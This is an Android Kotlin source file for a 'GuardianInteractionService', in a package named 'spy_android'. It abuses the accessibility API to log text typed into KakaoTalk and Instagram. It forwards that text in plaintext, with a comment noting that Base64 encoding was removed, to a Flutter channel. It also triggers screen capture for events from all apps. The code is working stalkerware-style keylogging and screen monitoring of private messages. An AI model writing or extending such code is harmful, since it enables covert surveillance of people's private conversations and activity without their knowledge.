package com.example.spy_android

import android.view.accessibility.AccessibilityEvent
import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import io.flutter.plugin.common.MethodChannel

class GuardianInteractionService : AccessibilityService() {

    companion object {
        private const val TAG = "GuardianInteraction"
        var methodChannel: MethodChannel? = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // 1. 텍스트 입력 감지 (카톡, 인스타)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: return
            
            if (packageName == "com.kakao.talk" || packageName == "com.instagram.android") {
                val source = event.source ?: return
                if (source.isPassword) return

                val text = event.text.joinToString("")
                if (text.isEmpty()) return

                // Base64 제거하고 평문으로 전송
                val payload = mapOf(
                    "timestamp" to System.currentTimeMillis().toString(),
                    "app" to if (packageName == "com.kakao.talk") "kakaotalk" else "instagram",
                    "data" to text
                )

                methodChannel?.invokeMethod("onInteractionCaptured", payload)
                Log.d(TAG, "Interaction captured from $packageName")
            }
        }
        
        // 2. 화면 활동 캡처 (모든 앱)
        GuardianScreenCaptureService.captureScreenActivity(event, methodChannel)
    }

    override fun onInterrupt() {
        Log.e(TAG, "Service Interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Guardian Interaction Service Connected")
    }
}
